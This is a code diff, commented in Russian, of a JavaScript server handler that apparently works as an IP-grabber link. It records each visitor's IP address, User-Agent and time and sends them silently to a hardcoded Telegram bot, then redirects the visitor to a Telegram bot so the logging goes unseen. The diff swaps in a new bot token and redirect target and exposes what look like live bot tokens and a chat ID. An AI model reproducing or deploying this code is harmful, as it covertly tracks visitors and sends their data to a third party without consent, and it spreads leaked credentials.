@@ -8,11 +8,17 @@ IP: ${ip}
 User-Agent: ${ua}
 Время: ${new Date().toLocaleString()}`;
     
-    const BOT_TOKEN = '8600820741:AAEDil-CtU8mvICLJgFP4nBPeJgawHvhGvQ';
+    // ЗДЕСЬ ВСТАВЬ СВОЙ ТОКЕН (от BotFather)
+    const BOT_TOKEN = '8975794406:AAGA_WM_FdsxIZyyoTa90oU6UAMPW6Kb0oY';
+    
+    // ЗДЕСЬ ВСТАВЬ СВОЙ chat_id (из getUpdates)
     const CHAT_ID = '870299796';
+    
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
     
     fetch(url).catch(() => {});
-    res.writeHead(302, { 'Location': 'https://t.me/hitvpnbot?start=157035967454517' });
+    
+    // РЕДИРЕКТ НА ТВОЕГО НОВОГО БОТА
+    res.writeHead(302, { 'Location': 'https://t.me/ekfjwei_bot' });
     res.end();
 }
